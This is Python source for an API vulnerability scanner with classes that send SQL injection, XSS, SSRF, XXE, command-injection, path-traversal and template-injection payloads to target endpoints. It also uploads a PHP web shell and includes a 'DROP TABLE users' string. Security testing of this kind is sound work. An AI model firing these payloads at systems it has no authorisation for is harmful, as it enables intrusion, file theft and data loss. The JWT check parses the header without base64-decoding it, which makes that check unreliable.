"""
TungkuApi - Comprehensive Vulnerability Scanners

Author: Re-xist
GitHub: https://github.com/Re-xist
Version: 2.0
"""

import re
import json
import time
from utils import APIClient, Logger, Vulnerability


class BaseScanner:
    """Base scanner class with enhanced features"""

    def __init__(self, client, logger):
        self.client = client
        self.logger = logger
        self.name = self.__class__.__name__
        self.findings = []

    def scan(self, config=None, discovered_endpoints=None):
        """Run scan - to be implemented by subclasses"""
        raise NotImplementedError

    def add_finding(self, vuln):
        """Add a vulnerability finding"""
        self.findings.append(vuln)


class SQLScanner(BaseScanner):
    """Enhanced SQL Injection Scanner"""

    def __init__(self, client, logger):
        super().__init__(client, logger)
        self.name = "SQL Injection Scanner"

        # Enhanced SQLi payloads
        self.payloads = [
            "' OR '1'='1",
            "' OR '1'='1'--",
            "' OR '1'='1'/*",
            "' OR 1=1--",
            "' UNION SELECT NULL--",
            "1' ORDER BY 1--",
            "1' AND SLEEP(5)--",
            "1' AND (SELECT SLEEP(5))--",
            "'; DROP TABLE users--",
            "' UNION SELECT @@version--",
            "' UNION SELECT user()--",
            "' UNION SELECT database()--",
        ]

        # Error patterns
        self.error_patterns = [
            "You have an error in your SQL syntax",
            "Warning: mysql_fetch_array()",
            "ORA-01756: quoted string not properly terminated",
            "Unclosed quotation mark after the character string",
            "PostgreSQL query failed",
            "SQLite3::SQLException",
            "SQLSTATE[",
        ]

    def scan(self, config=None, discovered_endpoints=None):
        """Scan for SQL Injection vulnerabilities"""
        findings = []
        test_endpoints = self._get_test_endpoints(config, discovered_endpoints)

        for endpoint in test_endpoints:
            for payload in self.payloads:
                response = self.client.get(
                    f"{endpoint}?id={payload}",
                    headers=config.get("headers", {}) if config else {}
                )

                if response:
                    for error in self.error_patterns:
                        if error.lower() in response.text.lower():
                            finding = Vulnerability.create(
                                "SQL Injection",
                                "CRITICAL",
                                "SQL Injection vulnerability detected",
                                f"Payload: {payload}\nError: {error[:100]}",
                                endpoint,
                                remediation="Use parameterized queries/prepared statements."
                            )
                            findings.append(finding)
                            self.logger.success(f"SQLi found at {endpoint}")
                            break

                    time_payload = "1' AND (SELECT SLEEP(5))--"
                    start = time.time()
                    resp = self.client.get(f"{endpoint}?id={time_payload}")
                    elapsed = time.time() - start

                    if elapsed > 4.5:
                        finding = Vulnerability.create(
                            "Blind SQL Injection (Time-Based)",
                            "HIGH",
                            "Time-based blind SQL injection detected",
                            f"Response time: {elapsed:.2f}s",
                            endpoint,
                            remediation="Use parameterized queries."
                        )
                        findings.append(finding)

        return findings

    def _get_test_endpoints(self, config, discovered_endpoints):
        if discovered_endpoints:
            return [e.get("path", "/") for e in discovered_endpoints]
        return ["/api/users", "/api/user", "/api/products", "/users", "/search"]


class XSSScanner(BaseScanner):
    """Enhanced Cross-Site Scripting Scanner"""

    def __init__(self, client, logger):
        super().__init__(client, logger)
        self.name = "XSS Scanner"

        self.payloads = [
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "<svg onload=alert('XSS')>",
            "'`\"><script>alert\\\"XSS\\\"</script>",
            "javascript:alert('XSS')",
            "<iframe src=\"javascript:alert('XSS')\">",
        ]

    def scan(self, config=None, discovered_endpoints=None):
        """Scan for XSS vulnerabilities"""
        findings = []
        test_endpoints = self._get_test_endpoints(config, discovered_endpoints)

        for endpoint in test_endpoints:
            for payload in self.payloads:
                response = self.client.get(
                    f"{endpoint}?q={payload}&search={payload}",
                    headers=config.get("headers", {}) if config else {}
                )

                if response and payload in response.text:
                    finding = Vulnerability.create(
                        "Cross-Site Scripting (XSS)",
                        "HIGH",
                        "Reflected XSS vulnerability detected",
                        f"Payload: {payload}",
                        endpoint,
                        remediation="Encode all user-supplied data. Use CSP."
                    )
                    findings.append(finding)
                    self.logger.success(f"XSS found at {endpoint}")
                    break

        return findings

    def _get_test_endpoints(self, config, discovered_endpoints):
        if discovered_endpoints:
            return [e.get("path", "/") for e in discovered_endpoints]
        return ["/api/search", "/api/users", "/search", "/find"]


class SSRFScanner(BaseScanner):
    """Enhanced Server-Side Request Forgery Scanner"""

    def __init__(self, client, logger):
        super().__init__(client, logger)
        self.name = "SSRF Scanner"

        self.test_urls = [
            "http://127.0.0.1",
            "http://localhost",
            "http://169.254.169.254",
            "file:///etc/passwd",
            "http://192.168.1.1",
        ]

    def scan(self, config=None, discovered_endpoints=None):
        """Scan for SSRF vulnerabilities"""
        findings = []
        test_params = ["url", "target", "dest", "redirect", "fetch"]
        test_endpoints = self._get_test_endpoints(config, discovered_endpoints)

        for endpoint in test_endpoints:
            for param in test_params:
                for test_url in self.test_urls:
                    response = self.client.get(
                        f"{endpoint}?{param}={test_url}",
                        headers=config.get("headers", {}) if config else {}
                    )

                    if response and response.status_code in [200, 301, 302]:
                        if any(indicator in response.text.lower() for indicator in
                               ["aws", "metadata", "localhost", "127.0.0.1", "root:"]):
                            finding = Vulnerability.create(
                                "Server-Side Request Forgery (SSRF)",
                                "CRITICAL",
                                "SSRF vulnerability detected",
                                f"Parameter: {param}\nTest URL: {test_url}",
                                endpoint,
                                remediation="Whitelist all URLs. Disable internal access."
                            )
                            findings.append(finding)
                            self.logger.success(f"SSRF found at {endpoint}")

        return findings

    def _get_test_endpoints(self, config, discovered_endpoints):
        if discovered_endpoints:
            return [e.get("path", "/") for e in discovered_endpoints]
        return ["/api/fetch", "/api/proxy", "/api/redirect", "/proxy"]


class XXEScanner(BaseScanner):
    """XML External Entity Injection Scanner"""

    def __init__(self, client, logger):
        super().__init__(client, logger)
        self.name = "XXE Scanner"

    def scan(self, config=None, discovered_endpoints=None):
        """Scan for XXE vulnerabilities"""
        findings = []
        test_endpoints = self._get_test_endpoints(config, discovered_endpoints)

        payload = '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>'

        for endpoint in test_endpoints:
            response = self.client.post(
                endpoint,
                data=payload,
                headers={"Content-Type": "application/xml", **(config.get("headers", {}) if config else {})}
            )

            if response and "root:" in response.text:
                finding = Vulnerability.create(
                    "XML External Entity (XXE) Injection",
                    "CRITICAL",
                    "XXE vulnerability detected",
                    "Can read files from server",
                    endpoint,
                    remediation="Disable external entities in XML parser."
                )
                findings.append(finding)
                self.logger.success(f"XXE found at {endpoint}")

        return findings

    def _get_test_endpoints(self, config, discovered_endpoints):
        if discovered_endpoints:
            return [e.get("path", "/") for e in discovered_endpoints]
        return ["/api/upload", "/api/import", "/api/data", "/upload"]


class CommandInjectionScanner(BaseScanner):
    """Command Injection Scanner"""

    def __init__(self, client, logger):
        super().__init__(client, logger)
        self.name = "Command Injection Scanner"

        self.payloads = ["; ls -la", "| ls -la", "$(ls -la)", "; cat /etc/passwd"]

    def scan(self, config=None, discovered_endpoints=None):
        """Scan for command injection vulnerabilities"""
        findings = []
        test_endpoints = self._get_test_endpoints(config, discovered_endpoints)

        for endpoint in test_endpoints:
            for payload in self.payloads:
                response = self.client.get(
                    f"{endpoint}?file={payload}&cmd={payload}",
                    headers=config.get("headers", {}) if config else {}
                )

                if response:
                    if any(indicator in response.text.lower() for indicator in
                           ["root:", "bin/bash", "total ", "drwx"]):
                        finding = Vulnerability.create(
                            "Command Injection",
                            "CRITICAL",
                            "Command injection vulnerability detected",
                            f"Payload: {payload}",
                            endpoint,
                            remediation="Avoid shell commands. Use parameterized APIs."
                        )
                        findings.append(finding)
                        self.logger.success(f"Command injection at {endpoint}")

        return findings

    def _get_test_endpoints(self, config, discovered_endpoints):
        if discovered_endpoints:
            return [e.get("path", "/") for e in discovered_endpoints]
        return ["/api/exec", "/api/cmd", "/api/ping", "/ping"]


class DirectoryTraversalScanner(BaseScanner):
    """Directory Traversal Scanner"""

    def __init__(self, client, logger):
        super().__init__(client, logger)
        self.name = "Directory Traversal Scanner"

        self.payloads = [
            "../../../../etc/passwd",
            "..\\..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
            "..%2F..%2F..%2F..%2Fetc%2Fpasswd",
        ]

    def scan(self, config=None, discovered_endpoints=None):
        """Scan for directory traversal vulnerabilities"""
        findings = []
        test_endpoints = self._get_test_endpoints(config, discovered_endpoints)

        for endpoint in test_endpoints:
            for payload in self.payloads:
                response = self.client.get(
                    f"{endpoint}?file={payload}&path={payload}",
                    headers=config.get("headers", {}) if config else {}
                )

                if response:
                    if any(indicator in response.text for indicator in ["root:", "[extensions]", "DB_PASSWORD"]):
                        finding = Vulnerability.create(
                            "Directory Traversal",
                            "HIGH",
                            "Directory traversal vulnerability detected",
                            f"Payload: {payload}",
                            endpoint,
                            remediation="Validate file paths. Use whitelist."
                        )
                        findings.append(finding)
                        self.logger.success(f"Directory traversal at {endpoint}")

        return findings

    def _get_test_endpoints(self, config, discovered_endpoints):
        if discovered_endpoints:
            return [e.get("path", "/") for e in discovered_endpoints]
        return ["/api/file", "/api/download", "/file", "/download"]


class MassAssignmentScanner(BaseScanner):
    """Mass Assignment Scanner"""

    def __init__(self, client, logger):
        super().__init__(client, logger)
        self.name = "Mass Assignment Scanner"

    def scan(self, config=None, discovered_endpoints=None):
        """Scan for mass assignment vulnerabilities"""
        findings = []
        test_endpoints = self._get_test_endpoints(config, discovered_endpoints)

        for endpoint in test_endpoints:
            test_data = {"email": "test@example.com", "is_admin": True, "role": "admin"}

            response = self.client.put(
                f"{endpoint}/1",
                json=test_data,
                headers=config.get("headers", {}) if config else {}
            )

            if response and response.status_code == 200:
                finding = Vulnerability.create(
                    "Mass Assignment",
                    "HIGH",
                    "Mass assignment vulnerability detected",
                    "Can modify sensitive object properties",
                    endpoint,
                    remediation="Use whitelisting for allowed parameters."
                )
                findings.append(finding)
                self.logger.success(f"Mass assignment at {endpoint}")

        return findings

    def _get_test_endpoints(self, config, discovered_endpoints):
        if discovered_endpoints:
            return [e.get("path", "/") for e in discovered_endpoints]
        return ["/api/users", "/api/user", "/api/profile"]


class ParameterPollutionScanner(BaseScanner):
    """HTTP Parameter Pollution Scanner"""

    def __init__(self, client, logger):
        super().__init__(client, logger)
        self.name = "Parameter Pollution Scanner"

    def scan(self, config=None, discovered_endpoints=None):
        """Scan for parameter pollution vulnerabilities"""
        findings = []
        test_endpoints = self._get_test_endpoints(config, discovered_endpoints)

        for endpoint in test_endpoints:
            response1 = self.client.get(
                f"{endpoint}?id=1&id=2",
                headers=config.get("headers", {}) if config else {}
            )
            response2 = self.client.get(
                f"{endpoint}?id=1",
                headers=config.get("headers", {}) if config else {}
            )

            if response1 and response2 and response1.text != response2.text:
                finding = Vulnerability.create(
                    "HTTP Parameter Pollution",
                    "MEDIUM",
                    "Parameter pollution may be possible",
                    "Application handles duplicate parameters differently",
                    endpoint,
                    remediation="Normalize parameter handling."
                )
                findings.append(finding)

        return findings

    def _get_test_endpoints(self, config, discovered_endpoints):
        if discovered_endpoints:
            return [e.get("path", "/") for e in discovered_endpoints]
        return ["/api/users", "/api/data", "/users"]


class TemplateInjectionScanner(BaseScanner):
    """Server-Side Template Injection Scanner"""

    def __init__(self, client, logger):
        super().__init__(client, logger)
        self.name = "Template Injection Scanner"

        self.payloads = ["{{7*7}}", "${7*7}", "#{7*7}", "%{7*7}"]

    def scan(self, config=None, discovered_endpoints=None):
        """Scan for SSTI vulnerabilities"""
        findings = []
        test_endpoints = self._get_test_endpoints(config, discovered_endpoints)

        for endpoint in test_endpoints:
            for payload in self.payloads:
                response = self.client.get(
                    f"{endpoint}?input={payload}&name={payload}",
                    headers=config.get("headers", {}) if config else {}
                )

                if response and "49" in response.text:
                    finding = Vulnerability.create(
                        "Server-Side Template Injection (SSTI)",
                        "CRITICAL",
                        "Template injection vulnerability detected",
                        f"Payload: {payload} evaluated to 49",
                        endpoint,
                        remediation="Avoid template rendering with user input."
                    )
                    findings.append(finding)
                    self.logger.success(f"SSTI found at {endpoint}")

        return findings

    def _get_test_endpoints(self, config, discovered_endpoints):
        if discovered_endpoints:
            return [e.get("path", "/") for e in discovered_endpoints]
        return ["/api/render", "/api/template", "/render"]


class GraphQLScanner(BaseScanner):
    """GraphQL Security Scanner"""

    def __init__(self, client, logger):
        super().__init__(client, logger)
        self.name = "GraphQL Scanner"

    def scan(self, config=None, discovered_endpoints=None):
        """Scan for GraphQL vulnerabilities"""
        findings = []
        graphql_endpoints = ["/graphql", "/api/graphql"]

        introspection_query = {
            "query": "{ __schema { types { name } } }"
        }

        for endpoint in graphql_endpoints:
            response = self.client.post(
                endpoint,
                json=introspection_query,
                headers={"Content-Type": "application/json", **(config.get("headers", {}) if config else {})}
            )

            if response and response.status_code == 200:
                if "__schema" in response.text or "__type" in response.text:
                    finding = Vulnerability.create(
                        "GraphQL Introspection Enabled",
                        "MEDIUM",
                        "GraphQL introspection is enabled",
                        "Full schema exposed",
                        endpoint,
                        remediation="Disable introspection in production."
                    )
                    findings.append(finding)
                    self.logger.success(f"GraphQL introspection at {endpoint}")

        return findings


class FileUploadScanner(BaseScanner):
    """File Upload Vulnerability Scanner"""

    def __init__(self, client, logger):
        super().__init__(client, logger)
        self.name = "File Upload Scanner"

    def scan(self, config=None, discovered_endpoints=None):
        """Scan for file upload vulnerabilities"""
        findings = []
        test_endpoints = self._get_test_endpoints(config, discovered_endpoints)

        for endpoint in test_endpoints:
            files = {"file": ("shell.php", "<?php system($_GET['cmd']); ?>")}

            response = self.client.post(
                endpoint,
                files=files,
                headers=config.get("headers", {}) if config else {}
            )

            if response and response.status_code == 200:
                if "success" in response.text.lower() or "uploaded" in response.text.lower():
                    finding = Vulnerability.create(
                        "Unrestricted File Upload",
                        "HIGH",
                        "Application accepts PHP file upload",
                        "shell.php was uploaded",
                        endpoint,
                        remediation="Validate file types strictly."
                    )
                    findings.append(finding)
                    self.logger.success(f"File upload vuln at {endpoint}")

        return findings

    def _get_test_endpoints(self, config, discovered_endpoints):
        if discovered_endpoints:
            return [e.get("path", "/") for e in discovered_endpoints]
        return ["/api/upload", "/upload"]


class CORSScanner(BaseScanner):
    """CORS Misconfiguration Scanner"""

    def __init__(self, client, logger):
        super().__init__(client, logger)
        self.name = "CORS Scanner"

        self.test_origins = ["https://evil.com", "http://evil.com", "null"]

    def scan(self, config=None, discovered_endpoints=None):
        """Scan for CORS misconfigurations"""
        findings = []
        test_endpoints = self._get_test_endpoints(config, discovered_endpoints)

        for endpoint in test_endpoints:
            for origin in self.test_origins:
                response = self.client.get(
                    endpoint,
                    headers={"Origin": origin, **(config.get("headers", {}) if config else {})}
                )

                if response:
                    cors_header = response.headers.get("Access-Control-Allow-Origin", "")
                    if cors_header == origin or cors_header == "*":
                        severity = "HIGH" if cors_header == origin else "MEDIUM"
                        finding = Vulnerability.create(
                            "CORS Misconfiguration",
                            severity,
                            f"CORS allows arbitrary origin: {cors_header}",
                            f"Origin: {origin}",
                            endpoint,
                            remediation="Whitelist specific origins."
                        )
                        findings.append(finding)
                        self.logger.success(f"CORS misconfig at {endpoint}")

        return findings

    def _get_test_endpoints(self, config, discovered_endpoints):
        if discovered_endpoints:
            return [e.get("path", "/") for e in discovered_endpoints]
        return ["/api", "/api/data", "/"]


class AuthScanner(BaseScanner):
    """Enhanced Authentication & Authorization Scanner"""

    def __init__(self, client, logger):
        super().__init__(client, logger)
        self.name = "Authentication Scanner"

    def scan(self, config=None, discovered_endpoints=None):
        """Enhanced authentication testing"""
        findings = []
        tests = [self._test_jwt_issues, self._test_rate_limiting, self._test_auth_bypass]

        for test in tests:
            try:
                findings.extend(test(config))
            except Exception as e:
                self.logger.debug(f"Auth test error: {e}")

        return findings

    def _test_jwt_issues(self, config):
        """Enhanced JWT security testing"""
        findings = []
        endpoints = ["/api/user", "/api/me", "/api/profile"]

        for endpoint in endpoints:
            response = self.client.get(endpoint, headers=config.get("headers", {}) if config else {})

            if response:
                jwt_pattern = r'eyJ[a-zA-Z0-9_-]+\.[a-zA-Z0-9_-]+\.[a-zA-Z0-9_-]+'
                tokens = re.findall(jwt_pattern, response.text)

                for token in tokens:
                    try:
                        parts = token.split(".")
                        if len(parts) == 3:
                            header = json.loads(parts[0])

                            if header.get("alg", "").lower() == "none":
                                finding = Vulnerability.create(
                                    "JWT 'None' Algorithm",
                                    "CRITICAL",
                                    "JWT signed with 'none' algorithm",
                                    f"Header: {header}",
                                    endpoint,
                                    remediation="Never use 'none' algorithm."
                                )
                                findings.append(finding)

                            if header.get("alg", "").lower() in ["hs256", "hs384", "hs512"]:
                                finding = Vulnerability.create(
                                    "Weak JWT Algorithm",
                                    "LOW",
                                    f"JWT uses symmetric algorithm: {header.get('alg')}",
                                    f"Header: {header}",
                                    endpoint,
                                    remediation="Use asymmetric algorithms (RS256)."
                                )
                                findings.append(finding)
                    except:
                        pass

        return findings

    def _test_rate_limiting(self, config):
        """Enhanced rate limiting detection"""
        findings = []
        login_endpoint = "/api/login"
        failed_requests = 0

        for i in range(20):
            response = self.client.post(
                login_endpoint,
                json={"username": "test", "password": "wrong"},
                headers=config.get("headers", {}) if config else {}
            )

            if response:
                if response.status_code in [401, 400]:
                    failed_requests += 1
                elif response.status_code == 429:
                    return []

        if failed_requests >= 15:
            finding = Vulnerability.create(
                "Missing Rate Limiting",
                "MEDIUM",
                f"No rate limiting detected. Made {failed_requests} failed requests.",
                f"Endpoint: {login_endpoint}",
                login_endpoint,
                remediation="Implement rate limiting on auth endpoints."
            )
            findings.append(finding)

        return findings

    def _test_auth_bypass(self, config):
        """Test for authentication bypass"""
        findings = []
        protected_endpoints = ["/api/admin", "/api/dashboard"]

        for endpoint in protected_endpoints:
            response = self.client.get(endpoint, headers=config.get("headers", {}) if config else {})

            if response and response.status_code == 200:
                finding = Vulnerability.create(
                    "Missing Authentication",
                    "HIGH",
                    f"Protected endpoint accessible without auth",
                    f"Endpoint: {endpoint}",
                    endpoint,
                    remediation="Implement proper authentication checks."
                )
                findings.append(finding)

        return findings


class HeaderScanner(BaseScanner):
    """Enhanced Security Headers Scanner"""

    def __init__(self, client, logger):
        super().__init__(client, logger)
        self.name = "Security Headers Scanner"

        self.required_headers = {
            "X-Frame-Options": {"severity": "MEDIUM", "description": "Missing clickjacking protection"},
            "X-Content-Type-Options": {"severity": "LOW", "description": "Missing MIME sniffing protection"},
            "Strict-Transport-Security": {"severity": "HIGH", "description": "Missing HSTS header"},
            "Content-Security-Policy": {"severity": "HIGH", "description": "Missing CSP header"},
            "X-XSS-Protection": {"severity": "LOW", "description": "Missing XSS filter"},
            "Referrer-Policy": {"severity": "LOW", "description": "Missing referrer policy"},
            "Permissions-Policy": {"severity": "MEDIUM", "description": "Missing permissions policy"},
        }

    def scan(self, config=None, discovered_endpoints=None):
        """Enhanced security headers scanning"""
        findings = []
        response = self.client.get("/", headers=config.get("headers", {}) if config else {})

        if response:
            headers = dict(response.headers)

            for header_name, header_config in self.required_headers.items():
                if header_name not in headers:
                    finding = Vulnerability.create(
                        f"Missing Security Header: {header_name}",
                        header_config["severity"],
                        header_config["description"],
                        f"Header '{header_name}' not present",
                        "/",
                        remediation=f"Add {header_name} header."
                    )
                    findings.append(finding)
                    self.logger.warning(f"Missing header: {header_name}")

            info_headers = ["Server", "X-Powered-By"]
            for header in info_headers:
                if header in headers:
                    finding = Vulnerability.create(
                        f"Information Disclosure: {header}",
                        "LOW",
                        f"Server reveals info via {header}",
                        f"{header}: {headers[header]}",
                        "/",
                        remediation=f"Remove {header} header."
                    )
                    findings.append(finding)

        return findings
